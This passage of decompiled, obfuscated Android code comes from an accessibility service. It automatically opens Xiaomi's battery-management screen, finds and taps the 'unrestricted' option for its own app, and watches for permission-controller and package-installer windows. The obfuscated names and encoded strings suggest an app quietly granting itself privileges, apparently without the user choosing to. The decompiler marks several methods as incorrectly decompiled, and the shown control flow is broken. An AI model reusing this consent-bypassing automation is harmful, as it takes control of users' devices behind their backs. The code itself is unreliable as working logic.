                        intent.setComponent(new ComponentName(StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM="), "com.miui.powercenter.Poweriuzxujjtqev"));
                        intent.addFlags(276824064);
                        this.f53957a0.f55048a1.startActivity(intent);
                        return Boolean.TRUE;
                    }
                }).iterator();
                while (it.hasNext()) {
                    try {
                    } catch (Exception e) {
                        tz0.m214810b0("[小米后台] 打开失败: ", e.getMessage(), str2);
                    }
                    if (((Boolean) ((w00) it.next()).invoke()).booleanValue()) {
                        t60.m214704c5(str2, "[小米后台] 页面打开成功");
                        genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = this;
                        genericSteps$executeXiaomiBackgroundManagement$1.f53943a1 = strM212137c1;
                        genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 1;
                        if (b81.m210571b1(2000L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                            str = strM212137c1;
                            c0364a1 = this;
                            genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a1;
                            genericSteps$executeXiaomiBackgroundManagement$1.f53943a1 = str;
                            genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 2;
                            if (c0364a1.m212141c7(1500L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                                c0364a12 = c0364a1;
                                dqtvuisjd dqtvuisjdVar = c0364a12.f55047a0;
                                String str3 = c0364a12.f55049a2;
                                rootInActiveWindow = dqtvuisjdVar.getRootInActiveWindow();
                                if (rootInActiveWindow != null) {
                                    Iterator it2 = dh0.f55766b6.iterator();
                                    while (it2.hasNext()) {
                                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it2.next());
                                        if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty() && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                                            Iterator<T> it3 = listFindAccessibilityNodeInfosByText2.iterator();
                                            while (it3.hasNext()) {
                                                if (((AccessibilityNodeInfo) it3.next()).isVisibleToUser()) {
                                                    c0364a13 = c0364a12;
                                                    String str4 = c0364a13.f55049a2;
                                                    rootInActiveWindow3 = c0364a13.f55047a0.getRootInActiveWindow();
                                                    if (rootInActiveWindow3 != null) {
                                                        for (String str5 : dh0.f55766b6) {
                                                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText3 = rootInActiveWindow3.findAccessibilityNodeInfosByText(str5);
                                                            if (listFindAccessibilityNodeInfosByText3 != null && !listFindAccessibilityNodeInfosByText3.isEmpty()) {
                                                                for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText3) {
                                                                    if (accessibilityNodeInfo.isVisibleToUser()) {
                                                                        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                                                                        for (int i3 = i; parent != null && i3 < 3; i3++) {
                                                                            if (parent.isChecked() || parent.isSelected()) {
                                                                                tz0.m214809a9("[小米后台] '", str5, "' 已经是选中状态", str4);
                                                                                t60.m214704c5(str4, "[小米后台] ✅ 已选择无限制");
                                                                                genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a13;
                                                                                genericSteps$executeXiaomiBackgroundManagement$1.f53943a1 = null;
                                                                                genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 5;
                                                                                if (b81.m210571b1(500L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                                                                                    c0364a13.m212138c2();
                                                                                    genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a13;
                                                                                    genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 6;
                                                                                    if (b81.m210571b1(300L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                                                                                        genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = null;
                                                                                        genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 7;
                                                                                        break;
                                                                                    }
                                                                                }
                                                                            } else {
                                                                                parent = parent.getParent();
                                                                            }
                                                                        }
                                                                        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
                                                                        int iCenterX = rectM24a5.centerX();
                                                                        int iCenterY = rectM24a5.centerY();
                                                                        StringBuilder sbM40c1 = AbstractC0003a2.m40c1("[小米后台] 找到'", str5, "'，坐标点击(", iCenterX, ", ");
                                                                        sbM40c1.append(iCenterY);
                                                                        sbM40c1.append(")");
                                                                        t60.m214704c5(str4, sbM40c1.toString());
                                                                        c0364a13.m212123a2(rectM24a5.centerX(), rectM24a5.centerY());
                                                                        t60.m214704c5(str4, "[小米后台] ✅ 已选择无限制");
                                                                        genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a13;
                                                                        genericSteps$executeXiaomiBackgroundManagement$1.f53943a1 = null;
                                                                        genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 5;
                                                                        if (b81.m210571b1(500L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                    t60.m214704c5(str4, "[小米后台] ❌ 未能点击无限制");
                                                    c0364a13.m212138c2();
                                                    genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a13;
                                                    genericSteps$executeXiaomiBackgroundManagement$1.f53943a1 = null;
                                                    genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 8;
                                                    if (b81.m210571b1(300L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                                                        genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = null;
                                                        genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 9;
                                                        break;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                                t60.m214704c5(str3, "[小米后台] 可能在列表页，尝试找APP名点击...");
                                rootInActiveWindow2 = c0364a12.f55047a0.getRootInActiveWindow();
                                if (rootInActiveWindow2 != null && (listFindAccessibilityNodeInfosByText = rootInActiveWindow2.findAccessibilityNodeInfosByText(str)) != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                    for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText) {
                                        if (accessibilityNodeInfo2.isVisibleToUser()) {
                                            Rect rectM24a52 = AbstractC0003a2.m24a5(accessibilityNodeInfo2);
                                            c0364a12.m212123a2(rectM24a52.centerX(), rectM24a52.centerY());
                                            t60.m214704c5(str3, "[小米后台] 点击APP名'" + str + "'");
                                            genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a12;
                                            genericSteps$executeXiaomiBackgroundManagement$1.f53943a1 = null;
                                            genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 3;
                                            if (b81.m210571b1(1500L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                                                c0364a13 = c0364a12;
                                                genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a13;
                                                genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 4;
                                                if (c0364a13.m212141c7(1000L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                                                    String str42 = c0364a13.f55049a2;
                                                    rootInActiveWindow3 = c0364a13.f55047a0.getRootInActiveWindow();
                                                    if (rootInActiveWindow3 != null) {
                                                    }
                                                    t60.m214704c5(str42, "[小米后台] ❌ 未能点击无限制");
                                                    c0364a13.m212138c2();
                                                    genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a13;
                                                    genericSteps$executeXiaomiBackgroundManagement$1.f53943a1 = null;
                                                    genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 8;
                                                    if (b81.m210571b1(300L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                                c0364a13 = c0364a12;
                                String str422 = c0364a13.f55049a2;
                                rootInActiveWindow3 = c0364a13.f55047a0.getRootInActiveWindow();
                                if (rootInActiveWindow3 != null) {
                                }
                                t60.m214704c5(str422, "[小米后台] ❌ 未能点击无限制");
                                c0364a13.m212138c2();
                                genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a13;
                                genericSteps$executeXiaomiBackgroundManagement$1.f53943a1 = null;
                                genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 8;
                                if (b81.m210571b1(300L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                                }
                            }
                        }
                        return coroutineSingletons;
                    }
                    continue;
                }
                t60.m214704c5(str2, "[小米后台] 无法打开省电策略页面，跳过");
                return Boolean.FALSE;
            case 1:
                str = genericSteps$executeXiaomiBackgroundManagement$1.f53943a1;
                c0364a1 = genericSteps$executeXiaomiBackgroundManagement$1.f53942a0;
                kg1.m213544f4(obj);
                i = 0;
                genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a1;
                genericSteps$executeXiaomiBackgroundManagement$1.f53943a1 = str;
                genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 2;
                if (c0364a1.m212141c7(1500L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 2:
                str = genericSteps$executeXiaomiBackgroundManagement$1.f53943a1;
                c0364a12 = genericSteps$executeXiaomiBackgroundManagement$1.f53942a0;
                kg1.m213544f4(obj);
                i = 0;
                dqtvuisjd dqtvuisjdVar2 = c0364a12.f55047a0;
                String str32 = c0364a12.f55049a2;
                rootInActiveWindow = dqtvuisjdVar2.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                }
                t60.m214704c5(str32, "[小米后台] 可能在列表页，尝试找APP名点击...");
                rootInActiveWindow2 = c0364a12.f55047a0.getRootInActiveWindow();
                if (rootInActiveWindow2 != null) {
                    while (r0.hasNext()) {
                    }
                    break;
                }
                c0364a13 = c0364a12;
                String str4222 = c0364a13.f55049a2;
                rootInActiveWindow3 = c0364a13.f55047a0.getRootInActiveWindow();
                if (rootInActiveWindow3 != null) {
                }
                t60.m214704c5(str4222, "[小米后台] ❌ 未能点击无限制");
                c0364a13.m212138c2();
                genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a13;
                genericSteps$executeXiaomiBackgroundManagement$1.f53943a1 = null;
                genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 8;
                if (b81.m210571b1(300L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                c0364a13 = genericSteps$executeXiaomiBackgroundManagement$1.f53942a0;
                kg1.m213544f4(obj);
                i = 0;
                genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a13;
                genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 4;
                if (c0364a13.m212141c7(1000L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                c0364a13 = genericSteps$executeXiaomiBackgroundManagement$1.f53942a0;
                kg1.m213544f4(obj);
                i = 0;
                String str42222 = c0364a13.f55049a2;
                rootInActiveWindow3 = c0364a13.f55047a0.getRootInActiveWindow();
                if (rootInActiveWindow3 != null) {
                }
                t60.m214704c5(str42222, "[小米后台] ❌ 未能点击无限制");
                c0364a13.m212138c2();
                genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a13;
                genericSteps$executeXiaomiBackgroundManagement$1.f53943a1 = null;
                genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 8;
                if (b81.m210571b1(300L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 5:
                c0364a13 = genericSteps$executeXiaomiBackgroundManagement$1.f53942a0;
                kg1.m213544f4(obj);
                c0364a13.m212138c2();
                genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = c0364a13;
                genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 6;
                if (b81.m210571b1(300L, genericSteps$executeXiaomiBackgroundManagement$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                c0364a13 = genericSteps$executeXiaomiBackgroundManagement$1.f53942a0;
                kg1.m213544f4(obj);
                genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = null;
                genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 7;
                break;
            case 7:
                kg1.m213544f4(obj);
                return Boolean.TRUE;
            case 8:
                c0364a13 = genericSteps$executeXiaomiBackgroundManagement$1.f53942a0;
                kg1.m213544f4(obj);
                genericSteps$executeXiaomiBackgroundManagement$1.f53942a0 = null;
                genericSteps$executeXiaomiBackgroundManagement$1.f53946a4 = 9;
                break;
            case 9:
                kg1.m213544f4(obj);
                return Boolean.FALSE;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* renamed from: c1 */
    public final String m212137c1() throws PackageManager.NameNotFoundException {
        Context context = this.f55048a1;
        try {
            PackageManager packageManager = context.getPackageManager();
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(context.getPackageName(), 0);
            t60.m214694b5(applicationInfo, "pm.getApplicationInfo(context.packageName, 0)");
            return packageManager.getApplicationLabel(applicationInfo).toString();
        } catch (Exception unused) {
            String string = context.getString(R$string.app_name);
            t60.m214694b5(string, "{\n            context.ge…e) // 从资源获取默认名称\n        }");
            return string;
        }
    }

    /* renamed from: c2 */
    public final void m212138c2() {
        try {
            this.f55047a0.performGlobalAction(1);
        } catch (Exception e) {
            tz0.m214807a7("返回失败: ", e.getMessage(), this.f55049a2);
        }
    }

    /* renamed from: c3 */
    public final boolean m212139c3() {
        String string;
        AccessibilityNodeInfo rootInActiveWindow = this.f55047a0.getRootInActiveWindow();
        if (rootInActiveWindow != null) {
            CharSequence packageName = rootInActiveWindow.getPackageName();
            if (packageName == null || (string = packageName.toString()) == null) {
                string = "";
            }
            List listM213306g5 = AbstractC0716jf.m213306g5("com.android.permissioncontroller", "com.google.android.permissioncontroller", "com.android.packageinstaller", "com.google.android.packageinstaller");
            if (listM213306g5 == null || !listM213306g5.isEmpty()) {
                Iterator it = listM213306g5.iterator();
                while (it.hasNext()) {
                    if (AbstractC0779a1.m213652a5(string, (String) it.next(), true)) {
                        break;
                    }
                }
            }
            Iterator it2 = AbstractC0715je.m213288h5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(dh0.f55750a0, dh0.f55753a3), dh0.f55758a8), dh0.f55759a9)).iterator();
            int i = 0;
            while (it2.hasNext()) {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it2.next());
                if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty() && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                    Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                    while (true) {
                        if (!it3.hasNext()) {
                            break;
                        }
                        if (((AccessibilityNodeInfo) it3.next()).isVisibleToUser()) {
                            i++;
                            break;
                        }
                    }
                }
            }
            if (i >= 2) {
                return true;
            }
        }
        return false;
    }

    /* JADX WARN: Code restructure failed: missing block: B:19:0x0058, code lost:
    
        if (p000.b81.m210571b1(200, r0) == r1) goto L24;
     */
    /* JADX WARN: Code restructure failed: missing block: B:23:0x006d, code lost:
    
        if (p000.b81.m210571b1(500, r0) == r1) goto L24;
     */
    /* JADX WARN: Removed duplicated region for block: B:18:0x0045  */
    /* JADX WARN: Removed duplicated region for block: B:22:0x005d  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:19:0x0058 -> B:21:0x005b). Please report as a decompilation issue!!! */
    /* renamed from: c5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212140c5(ContinuationImpl continuationImpl) throws Throwable {
        GenericSteps$returnToHome$1 genericSteps$returnToHome$1;
        int i;
        C0364a1 c0364a1;
        int i2;
        if (continuationImpl instanceof GenericSteps$returnToHome$1) {
            genericSteps$returnToHome$1 = (GenericSteps$returnToHome$1) continuationImpl;
            int i3 = genericSteps$returnToHome$1.f53952a5;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                genericSteps$returnToHome$1.f53952a5 = i3 - Integer.MIN_VALUE;
            } else {
                genericSteps$returnToHome$1 = new GenericSteps$returnToHome$1(this, continuationImpl);
            }
        }
        Object obj = genericSteps$returnToHome$1.f53950a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = genericSteps$returnToHome$1.f53952a5;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            i = 0;
            c0364a1 = this;
            i2 = 3;
            if (i >= i2) {
            }
            return coroutineSingletons;
        }
        if (i4 != 1) {
            if (i4 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return C1351vv.f60710b1;
        }
        i = genericSteps$returnToHome$1.f53949a2;
        i2 = genericSteps$returnToHome$1.f53948a1;
        c0364a1 = genericSteps$returnToHome$1.f53947a0;
        kg1.m213544f4(obj);
        i++;
        if (i >= i2) {
            c0364a1.f55047a0.performGlobalAction(1);
            genericSteps$returnToHome$1.f53947a0 = c0364a1;
            genericSteps$returnToHome$1.f53948a1 = i2;
            genericSteps$returnToHome$1.f53949a2 = i;
            genericSteps$returnToHome$1.f53952a5 = 1;
        } else {
            c0364a1.f55047a0.performGlobalAction(2);
            genericSteps$returnToHome$1.f53947a0 = null;
            genericSteps$returnToHome$1.f53952a5 = 2;
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: c7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212141c7(long j, ContinuationImpl continuationImpl) throws Throwable {
        GenericSteps$waitForPageStable$1 genericSteps$waitForPageStable$1;
        long jCurrentTimeMillis;
        int i;
        C0364a1 c0364a1;
        int i2;
        if (continuationImpl instanceof GenericSteps$waitForPageStable$1) {
            genericSteps$waitForPageStable$1 = (GenericSteps$waitForPageStable$1) continuationImpl;
            int i3 = genericSteps$waitForPageStable$1.f53965a7;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                genericSteps$waitForPageStable$1.f53965a7 = i3 - Integer.MIN_VALUE;
            } else {
                genericSteps$waitForPageStable$1 = new GenericSteps$waitForPageStable$1(this, continuationImpl);
            }
        }
        Object obj = genericSteps$waitForPageStable$1.f53963a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = genericSteps$waitForPageStable$1.f53965a7;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            jCurrentTimeMillis = System.currentTimeMillis();
            i = -1;
            c0364a1 = this;
            i2 = 0;
        } else {
            if (i4 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i5 = genericSteps$waitForPageStable$1.f53962a4;
            int i6 = genericSteps$waitForPageStable$1.f53961a3;
            jCurrentTimeMillis = genericSteps$waitForPageStable$1.f53960a2;
            long j2 = genericSteps$waitForPageStable$1.f53959a1;
            c0364a1 = genericSteps$waitForPageStable$1.f53958a0;
            kg1.m213544f4(obj);
            i = i6;
            i2 = i5;
            j = j2;
        }
        while (System.currentTimeMillis() - jCurrentTimeMillis < j) {
            AccessibilityNodeInfo rootInActiveWindow = c0364a1.f55047a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                int childCount = rootInActiveWindow.getChildCount();
                if (childCount != i || childCount <= 0) {
                    i2 = 0;
                    i = childCount;
                } else {
                    i2++;
                    if (i2 >= 2) {
                        return Boolean.TRUE;
                    }
                }
            }
            genericSteps$waitForPageStable$1.f53958a0 = c0364a1;
            genericSteps$waitForPageStable$1.f53959a1 = j;
            genericSteps$waitForPageStable$1.f53960a2 = jCurrentTimeMillis;
            genericSteps$waitForPageStable$1.f53961a3 = i;
            genericSteps$waitForPageStable$1.f53962a4 = i2;
            genericSteps$waitForPageStable$1.f53965a7 = 1;
            if (b81.m210571b1(150L, genericSteps$waitForPageStable$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
        }
        return Boolean.FALSE;
    }
}
